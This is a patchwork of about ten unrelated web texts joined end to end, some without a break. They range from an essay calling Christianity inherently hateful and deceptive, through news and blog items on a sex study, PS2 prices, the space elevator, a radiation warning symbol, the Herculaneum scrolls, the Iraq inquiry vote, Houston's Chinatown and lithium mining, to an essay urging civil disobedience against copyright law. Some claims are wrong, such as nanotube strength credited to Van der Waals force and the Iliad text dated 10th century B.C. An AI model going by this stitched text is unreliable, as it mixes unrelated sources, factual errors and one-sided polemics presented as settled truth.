What is the benefit in educating the general populace ?
It seems to me overwhelming .
I wonder to what extent people who preach the “ believe whatever and let others believe whatever ” position have really thought about it and to what extent they really care about the benefit of those others .
I can at least see it potentially being an excuse for avoiding conflict not because it is good to do so but because it is comfortable to do so — silence through apathy .
Or laziness .

In response , I feel something akin to what whoever said , “ The only thing necessary for evil to win is for good men to do nothing ” must have felt .
Perhaps you think that others might need their beliefs .
But do they really need the beliefs they espouse ?
And if so , does that justify to you allowing them to deceive others without being countered ?
If their beliefs are harmful to themselves or to others , should they not at least be given the opportunity for an alternative perspective ?
And should not people in general ?
I think in that I argue against certain perspectives , I am treating those that hold them with respect .
I am taking them and their perspective seriously .
It is relevant to me whether Christianity , or any number of other paradigms , is true or false .
Furthermore , if Christianity is harmful and baseless , which it appears to me to be , it seems to everyone ’s benefit , ceteris paribus , to be made aware of that .
There are any number of things that people like about Christianity , but I do not see those virtues as being exclusive to Christianity .
Love , for example , is not a Christian value .
It is a natural value .
To call love Christian is to detract from love .
Christian love is love minus non-Christian love .
Christian peace is peace minus non-Christian peace .
Christian truth is truth minus non-Christian truth .
But I would argue that if one looks closely at Christianity one will find that it is as much if not more about hatred , war , and deception — not through the misinterpretation of some of its followers , but inherently .
Maybe people think that if Christianity is false it would mean that God does not exist , or there is no afterlife , or life is meaningless — but all of these are in actuality quite separate issues , both from one another and from Christianity .
And would n't it be better for baseless beliefs to be destroyed and give way to beliefs based on reality ?
If you really cared about the existence of God or an afterlife or meaning or spirituality , you would never take anyone else ’s word for it .
You would try to seek the truth about such things directly .
And if you found that what you longed for most of all was true — what joy .
And if you found that what you feared most of all was true — what terrible pain .
But are you not entitled to that pain ?
There are any number of forces in society that want to keep you complacent , and they seek to do anything that is necessary — feed you any lies or poison that they need to — in order to keep you running smoothly as a cog in their machine .
But is this really to your benefit ?
You are worth a thousand times more to me than that .
They are afraid that if you find out the truth and it is not to your liking you will rebel or give up or go crazy — but are you not entitled to this ?
If life really were meaningless , what would be the point in pretending ?
So that you could continue to function and fulfill their purposes ?
People say , “ But they are happy believing that . ”
But are they ?
I think it makes some people happy , but I think it makes a lot of people miserable .
They say , “ It gives them comfort . ”
But does it ?
How does the belief in hell make you comfortable ?
Or the belief in Satan ?
Or the belief in sin ?
How do those things make you comfortable ?
And how valuable is comfort to you , really ?
If you decide that you care more about comfort than truth , if you are going to believe things independently of reason and evidence , at least believe things that are n’t terrible .
At least believe good things , happy things , things that enhance and sustain life .
If you want to get together with some friends , smoke pot , go dancing naked through the woods ( weather permitting ) , worship the Goddess , and sing songs of the Summerland , I say go crazy .
But to the extent that your beliefs are n't based on evidence or direct experience , do n’t take them too seriously .
Just do n’t be a jerk , I guess , is what I 'm saying .
Because I 'm sorry to report that it seems to me that a lot of you carry around a lot of beliefs which are largely dead weight .
They 're not true , and they do n't make you happy .
Not really happy .
Not as happy as you could be .
So what are you doing ?
A good number of you do n't even really believe the things the groups you associate with espouse .
Some of you just go along with it , but you have never really thought about it .
Others have thought about it , but you do n't know what else to do .
But I am asking you to try .
To really think about it .
Because I do n't think what you are doing is really good for you in the long run .
Or for your children .
You are teaching them values — but not good values .
Or at least , some bad mixed in with the good .
A little bit of poison to cripple them just a little bit .
If Christianity is able to gain converts solely because those converts are not aware of the issues — who does that benefit ?
If individuals are restricting their potential because they are told expansion is harmful — but in fact expansion is in no way harmful and is extremely beneficial — who does it benefit to allow such ignorance to remain ?
If people are made to feel separate from life because of sin but this separation is really just an illusion — who does it benefit to allow that illusion to continue ?
So what can you do ?
What positive steps can you take ?
Well , ultimately , of course , that is something you have to decide for yourself .
You are the one in your particular situation .
I am not .
But here is my advice , in general , for the general population that feels it needs some religious base .
If you are a member of the clergy , preach as liberal a message as you can .
By that , I do n't mean empty , as it has often meant .
I do not mean preach something wishy - washy where no one can really agree or disagree with you .
Rather , I ask you to make your job about conveying the understandings of mainline biblical scholarship to the people as much as possible .
Maybe you think they can't handle it , but give them some credit .
Especially the young .
Teach your constituents to be critical thinkers and revolutionaries .
Teach them to question everything .
Read excerpts from scholarly works from the pulpit to them , form study groups at your church , and encourage them to read , discuss , and share scholarly works and understandings on their own as much as possible .
When you quote a passage from the Bible , explain who , to the best of our knowledge , actually wrote it , and what the context was .
Preach as universal a message as you possibly can .
Preach love rather than Christian love .
Preach truth rather than Christian truth .
Preach justice rather than Christian justice .
Place Jesus and the Bible in their actual socio-historical context .
Read from and teach about other religions and secular philosophy .
Set up as many interfaith activities as you can with the other religious groups in the area .
Do your best to push the envelope without losing your constituents .
And if they fire you , do not worry .
New and better doors will open for you .
And you will feel alive in ways you no longer thought were possible .
Because you will be living genuinely .
You have the unique opportunity to make things better from the inside out .
Do it .
Fight for liberal values and get groups organized for liberal political agendas .
Promote an appreciation for the scientific method and the findings of science .
And get on the air , for life ’s sake .
Why is it that all these conservative televangelists are on the air and you are nowhere to be seen ?
Where are the “ Deconstructing the Bible ” television programs ?
I want to see them coming on more than these conservative Christian shows .
I am looking in your direction , liberal clergy , because as far as I am concerned you are not doing your job .
You know better .
You are biblically literate .
You know these people are liars , and you let them get away with it .
Chris Hedges is an inspiration to me , and he should be to you , too .
Because he is getting up and saying something .
He has the courage and the mettle not to let these dominionists take over the country without a fight .
And where are the rest of you when we need you most ?
Sulking in the shadows ?
What are you doing ?
They should be the ones sulking in the shadows .
Life forbid what Hedges fears comes to pass , and another terrorist attack leads to these new fundamentalists really taking over the country .
Is that what you want ?
Because I do n’t see you doing a whole lot to stop it .
Get it together .
Use your institution as a means to an end , not as an end in itself .
You should be a clinic to take individuals from fundamentalism to freethought .
You have your work cut out for you , but when this is done , be done with it .
Do n't encourage dependency .
Did n't you come into existence to bring an end to sin ?
Then follow my example , and end sin by transcending the concept .
And then be done with it .
What greater purpose could you possibly serve ?
To unite the world in love ?
But you , as Christians , can never do this .
Because for you to arrive at a place as a Christian , rather than as an individual , is to arrive wearing a T - shirt that says , “ I am distinct from you , and what I do I do for the glory of my own , separate institution . ”
And this is by no means love of them .
And if you 're a member of the laity , what can you do ?
Well , first of all , understand that just because you 're born into a tradition does n't mean you 're stuck with it .
You can leave .
You can change your mind .
If you so choose .
But let 's say that you like your tradition and decide you want to continue being a part of it .
My advice to you is to join as liberal a congregation as you can , and show your appreciation for them with your wallet .
Because people are pouring money into the pockets of fundamentalists .
Liberal Christian groups need as much support as they can get , and they should receive support , if they dedicate themselves to the enunciation of truth .
Put pressure on them to take an active role in politics and in opposing fundamentalism .
Do you want to study the Bible ?
I think most of you do n't , because most of you are n't really very active about doing it .
But I would recommend that you do study the Bible .
That you really study it .
Read mainstream scholarly works concerning our present understanding of the Bible .
Learn where the Bible came from .
You should be able to refute someone quoting C.S. Lewis , Lee Strobel , or Josh McDowell at the drop of a hat .
Very little independent research on your part should be sufficient to allow you to do this , since their arguments are all smoke and shadows .
And I think that it would be beneficial for you to do this .

Being in touch with your emotions helps in the bedroom Women who are more " emotionally intelligent " get greater pleasure from sex , research on twins suggests .
A study of more than 2,000 female twins showed that those with greater emotional intelligence had larger numbers of orgasms .
These women were better able to monitor their own and others ' feelings and emotions , which is key , say the King 's College London investigators .
Their findings appear in The Journal of Sexual Medicine .
Most women , and men for that matter , will have this problem at some stage in their life
Paula Hall , a sexual psychotherapist for Relate
All of the 2,035 participants completed questionnaires giving details of their sexual behaviour and performance and also answered questions designed to test their emotional intelligence .
The research found a significant association between emotional intelligence and the frequency of orgasm during masturbation and intercourse .
Professor Tim Spector , director of the Twin Research Department at King 's College London and co-author of the study , said : " These findings show that emotional intelligence is an advantage in many aspects of your life including the bedroom .
" This study will help enormously in the development of behavioural and cognitive therapies to improve women 's sexual lives . "
In tune Up to a third of women find it difficult or impossible to reach a climax during sex .
Lead author Andrea Burri said : " Emotional intelligence seems to have a direct impact on women 's sexual functioning by influencing her ability to communicate her sexual expectations and desires to her partner . "
She added that there was a possible connection with a woman 's ability to fantasise during sex or her feeling of control over the act .
Paula Hall , a sexual psychotherapist for Relate , said : " Emotional intelligence is most important in terms of overcoming problems .
" Most women , and men for that matter , will have this problem at some stage in their life .
It 's often situational - you are tired or stressed or having relationship problems , for example .
" It 's not just about technique and the environment being right .
" If you are aware of your own emotions and can identify the issues and communicate them , you are more likely to be able to resolve the difficulty . "

We 've nothing to go on but a good man 's word , but we 're hearing that the permanent retail price of Sony 's aged PlayStation 2 console will soon fall below the magical $ 100 mark .
And really , it'd be about time .
If you 'll recall , Sony last adjusted the price of the PS2 in ( surprise ! )
April of 2006 , and if this here tip proves true , the company will select April of 2009 to push the MSRP down to $ 99.99 .
The image above comes from a generally trustworthy Kmart pricing system , and while we 're certain you 'd all love a PS3 price drop to follow suit , we 've no reason to believe that one is close enough to touch .
As a couple of tipsters and commenters have pointed out , that screen 's most likely from a K - Mart Remote Management Unit ( RMU ) screen .
That 'd make EVT SP " Event Special " -- or in other words , a sale price for the listed days of April 5 to April 11 .
Space Elevator
Summary
For all those who fancy a vacation in space , here comes a concept straight out of a sci-fi book – The Space Elevator .
The good news is that institutions like NASA and others have started looking into greater details about the possibility of humans taking an elevator and travelling 22000 miles into space .
The overall scheme involves launching a satellite in geosynchronous orbit , lowering a cable to a sea platform and using the cable to carry people and payload .
It will be powered by lasers situated on ground beaming wirelessly to solar cells .
To fuel the imagination of people , NASA funded a competition in New Mexico to build and race space elevator prototypes .
The concept of carbon nanotubes is being explored in a big way to facilitate the building of the cable for the elevator .
Carbon atoms build a strong bond with the adjoining atoms due to a force called the Van der Waal 's force providing great strength to the carbon nanotubes .
According to Ray Baughman from the University of Texas at Dallas , “ It ’s a dream of the future but it is an achievable dream ” .
Danger : Nuclear power
Not many people are aware of it , but here ’s the new international symbol for radiation :
According to the IAEA ( International Atomic Energy Agency ) which promotes nuclear energy , the symbol means “ you are in danger , stop , run away .
So the message is actually “ death immenent — RUN FOR YOUR LIFE !!! ”
If you watch the video that the IAEA released to explain the video , you ’ll see that they decided to use this symbol to supplement the more common yellow ‘ trefoil ’ to protect people who encounter large sources of radiation without understanding that it can cause death .
Apparently , many cases of death via ionizing radiation is attributed to this ( illiterate people scavenging metal parts like lead from radioactive materials ) .
Right now the world is accumulating hundreds of thousands of tons of nuclear waste all of which will use this symbol .
So much for the argument that nuclear safety measures are airtight , huh ?
Here ’s their press release :
The IAEA launched this symbol on 15 February 2007
New Symbol Launched to Warn Public About Radiation Dangers
Supplementary Symbol Aims to Help Reduce Needless Deaths and Injuries
Staff Report
15 February 2007
New Radiation Symbol
The new supplementary radiation warning symbol .
With radiating waves , a skull and crossbones and a running person , a new ionizing radiation warning symbol is being introduced to supplement the traditional international symbol for radiation , the three cornered trefoil .
The new symbol is being launched today by the IAEA and the International Organization for Standardization ( ISO ) to help reduce needless deaths and serious injuries from accidental exposure to large radioactive sources .
It will serve as a supplementary warning to the trefoil , which has no intuitive meaning and little recognition beyond those educated in its significance .
“ I believe the international recognition of the specific expertise of both organizations will ensure that the new standard will be accepted and applied by governments and industry to improve the safety of nuclear applications , protection of people and the environment , ” said Ms. Eliana Amaral , Director , Division of Radiation , Transport and Waste Safety , IAEA .
The new symbol is aimed at alerting anyone , anywhere to the potential dangers of being close to a large source of ionizing radiation , the result of a five - year project conducted in 11 countries around the world .
The symbol was tested with different population groups – mixed ages , varying educational backgrounds , male and female – to ensure that its message of “ danger – stay away ” was crystal clear and understood by all .
“ We can´t teach the world about radiation , ” said Carolyn Mac Kenzie , an IAEA radiation specialist who helped develop the symbol , “ but we can warn people about dangerous sources for the price of sticker . ”
The new symbol , developed by human factor experts , graphic artists , and radiation protection experts , was tested by the Gallup Institute on a total of 1 650 individuals in Brazil , Mexico , Morocco , Kenya , Saudi Arabia , China , India , Thailand , Poland , Ukraine and the United States .
The symbol is intended for IAEA Category 1 , 2 and 3 sources defined as dangerous sources capable of death or serious injury , including food irradiators , teletherapy machines for cancer treatment and industrial radiography units .
The symbol is to be placed on the device housing the source , as a warning not to dismantle the device or to get any closer .
It will not be visible under normal use , only if someone attempts to disassemble the device .
The symbol will not be located on building access doors , transportation packages or containers .
“ The new ionizing radiation warning symbol ( ISO 21482 ) is the latest successful result of long - standing cooperation between the IAEA and ISO .
We encourage the symbol´s rapid adoption by the international community , ” said ISO Secretary - General Alan Bryden .
Many source manufacturers plan to use the symbol on new large sources .
Strategies to apply the symbol on existing large sources are being developed by the IAEA .

On Aug. 24 , 79 A.D. , Italy 's Mount Vesuvius exploded , burying the Roman towns of Herculaneum and Pompeii under tons of super - heated ash , rock and debris in one of the most famous volcanic eruptions in history .
Thousands died .
But somehow , hundreds of papyrus scrolls survived -- sort of -- in a villa at Herculaneum thought to have been owned at one time by Julius Caesar 's father - in - law .
The scrolls contained ancient philosophical and learned writings .
But they were so badly damaged -- literally turned to carbon by the volcanic heat -- that they crumbled when scholars first tried to open them centuries later .
The remaining scrolls , stored away in Italy and France , have n't been read -- or even unrolled -- since 79 AD .
Now , a computer scientist from the University of Kentucky hopes that modern digital technology will allow him to peer inside two of the fragile scrolls -- without physically opening them -- and unlock secrets they have held for almost 2,000 years .
Brent Seales , the Gill professor of engineering in UK 's computer science department , will use an X - Ray CT scanning system to collect interior images of the scrolls ' rolled - up pages .
Then , he and his colleagues hope to digitally " unroll " the scrolls on a computer screen so scholars can read them .
" It will be a challenge because today these things look more like charcoal briquets than scrolls , " Seales said .
" But we 're using a non-invasive scanning system , based on medical technology , that lets you slice through an object and develop a three - dimensional data set without having to open it , just as you would do a CT scan on a human body . "
The two scrolls that Seales and his team will work on are stored at the French National Academy in Paris .
The UK group will spend July working there .
Their system was developed at UK through the EDUCE project , or Enhanced Digital Unwrapping for Conservation and Exploration , which Seales launched through a grant from the National Science Foundation .
Experts say that if the UK system works as well as hoped , it could provide a safe new way to decipher and preserve more scrolls from Herculaneum , as well as other ancient books , manuscripts and documents that are too fragile to be opened .
" No one has yet really figured out a way to open them , " says Roger Macfarlane , a professor of classics at Brigham Young University who also has worked on scrolls from Herculaneum .
" If Brent is successful it would be a huge , potentially monumental step forward . "
Seales admits that there are hurdles , the biggest being the carbon - based ink thought to have been used on the scrolls .
He says that since the papyrus in the scrolls was turned to carbon by the fury of Vesuvius , it might be impossible to visually separate the writing from the pages , even with powerful computer programs .
" The open question is , will we be able to read the writing ? "
Seales said .
" There is a chance that we wo n't be able to do it with our current machine , and that we 'll have to re-engineer some things .
But if that 's the case , that 's what we will do . "
Seales , who is from Buffalo , N.Y. , grew up with two passions : computers and the humanities .
His double major in undergraduate school was computer science and violin .
While working on computer imaging in graduate school , Seales became interested in how that technology might be used to digitally preserve old manuscripts and documents .
By the early 1990s , he was developing systems to read old records that were crumpled and wrinkled with age .
As a result , he joined an international computer team that digitized the oldest known complete text of Homer 's Iliad , which is stored in Venice , Italy .
The project , ultimately completed at UK's Center for Visualization and Virtual Environments , produced new digital images , bringing to life sections of the text from the 10th century B.C. that previously were little more than ink smudges .
Developing a method to virtually unroll and copy ancient documents too delicate for normal handling was the next step .
This is the system that Seales and his colleagues will use on the Herculaneum scrolls .
If it works , what will they find ?
The best guess is that the scrolls contain writings by Philodemus , a Roman writer and Epicurean philosopher born about 110 B.C. Philodemus is not considered a classical thinker of the first rank , but he was a contemporary of Cicero .
He taught Virgil and is thought to have influenced the Roman poet Horace .
Philodemus also was a friend of Lucius Calpurnius Piso -- the father - in - law of Julius Caesar -- who at one time owned that luxurious villa at Herculaneum .
The mansion had passed to other hands , however , when it and Herculaneum were buried during the eruption of 79 A.D. Afterward , Herculaneum lay hidden for 1,600 years , until excavators stumbled upon it in 1709 .
The villa itself was not uncovered until the mid-1700s .
Inside its library , investigators found what they first thought to be lumps of coal but that turned out to be papyrus scrolls -- about 1,800 in all -- fused into blackened cylinders by furious volcanic heat .
The building became known as the Villa of the Papyri .
According to Seales , the scrolls did not burn because the building so was completely encased in ash and lava that no oxygen was available to feed any flames .
Ironically , experts say that the papyrus , made of plant material , almost certainly would have decomposed over the last 2,000 years had it not been sealed in what amounted to an airtight vault .
What survived was incredibly fragile .
Many scrolls simply crumbled when early researchers tried to open them .
A Vatican priest eventually developed a way of opening a few scrolls , but it was slow and produced mixed results .
Most were never unrolled .
The majority of the scrolls ultimately went to a library in Naples .
But Napoleon had several shipped to France when he took over Italy after 1800 .
Among these scrolls are the two that the UK team plans to investigate .
Seales describes the process as resembling a " virtual colonoscopy , " a medical test for colon cancer .
" In a colonoscopy , you 're interested in whether there 's cancerous activity on the wall of the colon , " he said .
" So you can imagine locating that in a scan , then flattening it out and manipulating it to see what you can see .
We 'll be doing a similar sort of thing . "
According to Seales , many experimental scans probably will be necessary , plus much additional computer work afterward , to produce clear images .
Members of the UK group wo n't touch the fragile materials .
All handling will be done by conservators at the French National Academy .
Macfarlane , the Brigham Young University scholar , predicted that if Seales ' team is successful , other Herculaneum scrolls probably also will be made available for scanning .
Those could contain works by other ancient writers , more important than Philodemus , perhaps by Epicurus , who founded one of the major philosophies of ancient Greece , Macfarlane said .
" If Brent does unlock the door to reading these scrolls that are still hiding text , there will be a lot of excitement , " he said .
Seales sees other potential applications for the system , including deciphering otherwise unreadable written materials for homeland security purposes .
But , he also admits that there are other ancient tests he'd like to examine .
" There are pieces of the Dead Sea scrolls that still have n't been opened yet , " he said .
" I 've talked with some members of teams that work with those materials , and I 'd love to see what more we could wring out of them .
" I guess I just like solving mysteries . "

A Tory attempt to change arrangements for the Iraq war inquiry has been defeated in the Commons .
But the government 's majority was cut to 39 votes as MPs rejected the motion , after the government said the inquiry would be able to apportion blame .
Some Labour MPs joined criticism of the way Gordon Brown initially announced it would be held in private .
The Tories had called for assurances on how much would be public and for MPs to decide its terms of reference .
They and the Lib Dems also want changes to the inquiry panel - to include people with military and ministerial experience .
Nineteen Labour MPs voted for the Tory motion which was defeated by 299 votes to 260 .
A government amendment , welcoming its announcement of the " wide ranging and independent " inquiry , was passed by 305 votes to 251 .
Terms of reference The Conservatives called the Commons debate after Mr Brown told MPs last week the inquiry would be in private .
Since then , and amid much criticism , he has said it is up to the inquiry 's chairman , Sir John Chilcot , to hold some sessions in public if he chooses .
BBC political correspondent Carole Walker said the vote 's result was not surprising because Gordon Brown had made some concessions .
It needs to be comprehensive , independent , not a trial or an impeachment but an effort to learn for the future
David Miliband
Foreign Secretary
Brown denies Iraq inquiry U - turn Chairman urges public Iraq probe
But during the six - hour debate many Labour backbenchers criticised the government 's handling of the affair and several MPs said they were still not clear about how much would be held in private .
Senior Labour MP
Tony
Wright described it as an " object lesson in how not to set up an inquiry " .
Many MPs also argued against leaving the terms of reference - and issue of whether witnesses should give evidence under oath - to Sir John to decide .
Speaking after the vote former Conservative leader Iain Duncan Smith said late vague concessions from the government were " no good " and it should be for the House of Commons , not Sir John , to decide on the inquiry 's remit .
' Made a mess '
During the debate shadow foreign secretary William Hague said Mr Brown had made a " mess " of announcing the inquiry by producing proposals for a " secretive , behind - closed - doors inquiry " .
He added the membership was too restricted while the timing of the inquiry - which is due to report back after the next election - was " utterly cynical and politically motivated " .
It suits the government to have us believe that the inquiry will be mostly in public , but I have my doubts
David Heath
Liberal Democrats
Since then he said the government had " engaged in a series of climbdowns - a U - turn executed in stages " and had relied on Sir John to announce changes , rather than " admit that the government were in the wrong " .
He said MPs should be asked to scrutinise and vote on all the terms and rules for the inquiry and it was " unfair " to leave it all to Sir John .
Foreign Secretary David Miliband said all parties agreed there was a need for an inquiry adding : " It needs to be comprehensive , independent , not a trial or an impeachment but an effort to learn for the future . "
He confirmed it would have access to all cabinet papers , papers from foreign governments and appeared to confirm it would have access to the original legal advice to cabinet on the legality of the war .
Under oath
But he said it was " right and proper to leave the discretion " on whether evidence should be given under oath , to Sir John .
However Clare Short , the former cabinet minister who resigned as a Labour MP over the war , and former Lib Dem leader Sir Menzies Campbell said the issue should be decided by MPs .
But , in what opposition parties say is a further concession from the government , the foreign secretary also said the inquiry would be free to " praise or blame whoever it likes " .

The prime minster had told MPs last week the inquiry would " not set out to apportion blame " .
Labour backbencher Gordon Prentice said he was still unclear about how much of the inquiry would be in public .
He said a briefing note circulated to Labour MPs had said the inquiry would " sit in private with scope for public events and hearings " - he believed it should have been the other way around .
Mr Miliband said Sir John had already said " as much as possible " should be public .
But for the Liberal Democrats , David Heath demanded to know the criteria for closed sessions .
He added : " It suits the government to have us believe that the inquiry will be mostly in public , but I have my doubts . "
Labour MPs Bob Marshall - Andrews and Paul Flynn both said the key question for the inquiry was whether Britain was " deceived " into going to war in Iraq .
Tory leader David Cameron says Tony Blair , Gordon Brown and Alastair Campbell [ Tony Blair 's former press secretary ] must give evidence in public .
Earlier the prime minister 's spokesman said Mr Brown would have " no difficulty in giving evidence in public " , if national security considerations were met .

Valerie Ng explores a side of Houston where the familiar fallbacks of BBQ and Tex - Mex are strangely absent .
Cruising Houston ’s Bellaire Blvd , Adriana and I watched as the English and Spanish of storefront signs gave way to Chinese and Vietnamese .
We pulled into one of the shopping centers lining the street , and found ourselves before an imposing Asian supermarket , wedged between a Halal Chinese restaurant and a Korean tofu and barbecue joint .
***
As the fourth largest city in the U.S. , Houston enjoys the diversity of its counterparts around the country .
In addition to Latino and African - American populations , the city is home to a growing Asian - American community , who began arriving in the 1870s .
An original Chinatown was located on Smith Street , near the present - day Alley Theatre , but the city ’s growth prevented the neighborhood from expanding .
Today , 9 % of Houston ’s 2.2 million are Asian American , roughly twice the national average .
Bellaire Blvd lacks the history of the Chinatowns etched into major cities such as San Francisco and New York .
Rather , it resembles San Diego ’s Convoy St , lined with young businesses that showcase the area ’s Asian heritage .
***
Making our way past Shanghai - and Szechuan - style eateries , we singled out a dim sum restaurant and joined several parties waiting to be seated .
The chatter of Cantonese , Mandarin , and even Tagalog filled the close entry room , with not a Texas drawl to be heard .
Glancing over the menu of porridge , dumplings , and rice noodle rolls , I could already imagine the taste of neatly wrapped , translucent har gow , slippery cheung fun , and crisp , deep - fried sesame balls .
In multicultural Houston , there ’s much more to the local cuisine than BBQ and Tex - Mex .
Community Connection :
All you Chinatown aficionados out there , how many of Trips ’ 8 most colorful Chinatowns have you visited ?

NEW YORK ( Reuters ) - New vehicle emission standards will likely be a boon for everything from aluminum to new plastics , but the producers of lithium -- a mineral used in batteries that power new generation vehicles -- could be the big winners .
Lithium-ion automotive batteries are seen in the Johnson Controls Saft Advanced Power Solutions ' factory in Nersac , southwestern France , January 31 , 2008 .

But while the few public companies that mine lithium will likely see surging revenue , they will also face the pressure that comes with all booms -- making supply meet ever - tightening availability .
Companies that mine lithium should see a long - term boost to their business , analysts said , although there are questions about whether there is enough lithium for all customers .
And some energy experts see the irony in lithium batteries replacing carbon - burning gasoline , since they believe
exploiting lithium could be just as destructive to the environment as pollution .
Lithium is generally mined from rock , but it can also be found in deposits in brine ponds .
It comes mostly from one region -- the Andes mountains of Chile , Argentina and Bolivia , with some deposits in China .
Chile ’s SQM is the world ’s largest producer , along with U.S. specialty chemical companies Rockwood Holdings Inc and FMC Corp .
There are enormous possibilities for profit .
“ We are ready and able to expand production , ” said Tim McKenna , a Rockwood spokesman .
“ In fact , in the last 18 months , we completed capacity expansion of our Chile operations to keep pace with expected demand from the auto industry . ”
McKenna said the auto industry is not likely to bring lithium - powered cars to the wider market much before 2011 , although the Mercedes S - class is expected to be the first lithium / hybrid car on the market late this year .
Rockwood , through its German subsidiary , Chemetall , produces lithium from brine lakes at Santiago Salar de Atacama in Chile and from a mine in Silver Peak , Nevada .
Chemetall has a 50 percent share of the global market for lithium and 30 percent for lithium carbonate , which is used for battery manufacture .
It produced 27,000 tons of lithium last year and is increasing production to about 33,000 tons next year and 40,000 tons by 2015 .
Current global demand is 16,000 tons per year , or 84,000 tons of lithium carbonate .
WASHINGTON WEIGHS IN
This week , the Obama administration announced new vehicle emission standards that come into effect by 2016 and the rules are seen as favoring hybrid and electric vehicles .
Analyst David Begleiter , of Deutsche Bank North America , said lithium for use in all kinds of batteries -- auto , laptop and other consumer products -- accounted for about one - third of Rockwood ’s $ 3.4 billion revenue last year .
“ There is no question ( new emission regulations ) will be very beneficial for Rockwood , although it depends on what happens with EHV ( Electric Hybrid Vehicle ) production increases and lithium carbonate pricing .
But they all suggest material benefits for Rockwood . ”
Begleiter said Rockwood and SQM have some of the world ’s best lithium reserves .
“ I do n’t believe there is a problem with supply , ” he said , although ramping up production might be slow because it takes up to 18 months for water to evaporate in brine ponds allowing the lithium to form .
Michael Harrison , an analyst at First Analysis Securities , said lithium would be a long - term driver for Rockwood .
“ There is no question the long - term trend is toward lithium - based batteries , but it depends on what kind of demand there is , ” he said .
“ It is clear to me that regulatory moves on fuel efficiency are going to help make electric cars a reality . ”
Harrison said current hybrids and electric cars mostly have nickel - based batteries , but he expects to see more cars with lithium batteries by 2011 - 2012 .
THE ANTI - LITHIUM CAMP
Not all analysts were uniformly cheery about the outlook for lithium or its major producers .
Analyst Ben Johnson of Morningstar voiced skepticism about new cars giving lithium producers a boost .
“ It ’s a clear positive on the supply side as a small handful of players control lithium resources , ” he said .
“ Lithium is not abundant by any means and future resources will be more difficult to exploit .
On the demand side , key sources of demand like consumer electronics have been very weak recently , but longer - term , cyclical headwinds will fade or normalize .
“ I am not jumping into the pool party that lithium is the be-all and end - all of transport fuel for the future .
It ’s too early to say , ” Johnson added .
William Tahil , research director of Meridian International Research , an independent consultancy specializing in renewable energy , is not convinced lithium is the answer .
“ Lithium Ion batteries are rapidly becoming the technology of choice for the next generation of electric vehicles , ” he noted in a research paper titled “ The Trouble with Lithium . ”
To achieve the required cuts in oil consumption , a significant percentage of the world ’s automobile fleet of 1 billion vehicles will be electrified in the next decade , he said .
Ultimately , all production , currently 60 million vehicles per year , will have to be replaced with electrified vehicles .
“ There are insufficient economically recoverable lithium resources available to sustain electrified vehicle manufacture in the volumes required , based solely on LiIon batteries .
“ Depletion rates would exceed current oil depletion rates and switch dependency from one diminishing resource to another .
Concentration of supply would create new geopolitical tensions , not reduce them , ” Tahil wrote .

Free “ as in freedom ” Software supporters , including the Free Software Foundation love to talk about freedom .
“ It ’s all about freedom ” , we say , freedom of computer users to know and control what runs on their computers , to copy and share it with others and to modify it as they wish .
The idea that software by nature cannot even be owned , is a popular one in the Free Software movement .
Yet there is a problem few seem to come even close to realizing yet if they did it could send shivers down their spine because it puts everything they think they know or believe on its head and makes this whole fervor around “ freedom ” seem somehow misplaced , like hacking the branches of a tree you want to cut down , and doing it for so long you ca n’t remember when you started .
And that problem lies in the simple fact evident in a logical following of the idea that “ software cannot be owned ” .
If software cannot be owned then copyright is invalid as a tool of attaining freedom , period , especially if you actually use it to your advantage .
At best your actions contradict your beliefs ( in which case you act hypocritically ) .
At worst , you are n’t even aware of the gross contradiction you are peddling while genuinely believing that you have it right and that the people whom you condemn as immoral should be punished for what they ’re doing ( as Richard Stallman said “ Proprietary software should be illegal ” ) .
Copyright by definition assumes ownership over what most Free Software supporters would claim cannot be owned , yet those same supporters cheer on GPL being successfully tested in courts , enforcing exactly the law which at its core contradicts their premises while calling it “ brilliant ” because it supposedly turns copyright on its head into “ copyleft ” .
Unfortunately , they do not realize that all they are doing is changing the terms , nothing more fundamental than that .
They are simply enforcing their vision .
They are NOT admitting people true freedom .
If you should distribute a GPL program without the terms attached or without the source code , because you own the medium on which it resides and software itself is unownable , FSF or Software Freedom Law Center would condemn it as an illegal act and in some cases threaten extraction of money from you by means of a lawsuit .
Is that promoting freedom ?
No it ’s not .
It ’s just another variation of forcing other people to live according to your own opinions .
If you are truly about freedom as it relates to software , then you would at least admit that copyright nor copyleft are the means by which to achieve it .
You would fully acknowledge that every transaction between two people is solely the business of those two people even when such a transaction involves sharing of a program written by you and originally provided under the terms of the General Public License .
Even if you adapted GPL to be used as merely a contract between two people independent of the copyright law , the agreement to share under the same terms would still be solely between the one sharing the program and the one getting it .
If you are n’t the one sharing it , even if you authored the original copy , you are NOT party to the agreement and thus have no say whatsoever as to how will other people share it with each other .
If 10th person down the line shares the program with 11th under same terms as agreed and then 11th person breaks those terms by sharing the program to the 12th person under different terms the only one 11th person is liable to is the 10th person , NOT the 9th person nor the 1st person ( being the author of the original copy ) or anyone else .
This is not how FSF , SFLC etc. operate , however .
If you get glibc from a random server somewhere on the internet rather than from GNU.org and then give it to someone under no terms whatsoever , it is still FSF who think they can sue you over it , which is completely inconsistent with the belief that software cannot be owned .
I made a late correction in the above paragraph .
Instead of 12th person being liable to 10th person I should ’ve said 11th person , since it is 11th who broke the agreement with 10th .
That was corrected now .
What , then , are they supposed to do if they wish to maintain this consistency and to be able to truly claim that they support freedom ?
They should support civil disobedience to copyright law while striving to operate independently of copyright law .
They should thus release software either in public domain or explicitly state that they are n’t relying on copyright while providing programs to people under agreements which are solely between them and the user who downloads or obtains from them , without pretension of legitimate control over transactions which DO NOT involve them , and are instead between people further down the distribution line .
I ’m gonna quote Kevin Dean from a recent article he was quoted in at LinuxInsider.com regarding the Mono controversy .
Quote :
If information is not owned , then “ systems proclaiming the ownership of information should simply be ignored , ” Dean said .
“ Yes , I ’m advocating civil disobedience .
Just as the European Pirate Party encouraged civil disobedience , and then made that issue the forefront of their campaign efforts , so should Mono users . ”
Accordingly , “ I strongly encourage every distro to adopt and make use of Mono , ” Dean said .
“ The number of applications that depend on it clearly demonstrate that it is a good tool .
“ I also encourage every distro to stand strong in this decision , to contest the potential day where Microsoft sues and STILL include Mono , even if some court says , ‘ You may not do this ’ , ” he said .
“ We ’ve seen this work with so - called ‘ non - free ’ formats like MP3 and encrypted DVDs ( libdvdcss ) , and by simply refusing to cater to draconian restrictions , we ’ve seen these technologies flourish and prosper . ”
There may be some in the Free Software movement who are uncomfortable with rejecting the idea that the author of software is its owner , Dean noted — “ the GNU project , for instance , might balk at the idea that they do NOT control how software they wrote is used by developers around the world , ” he said .
“ But consistency and ethical conduct are the price of freedom . ”
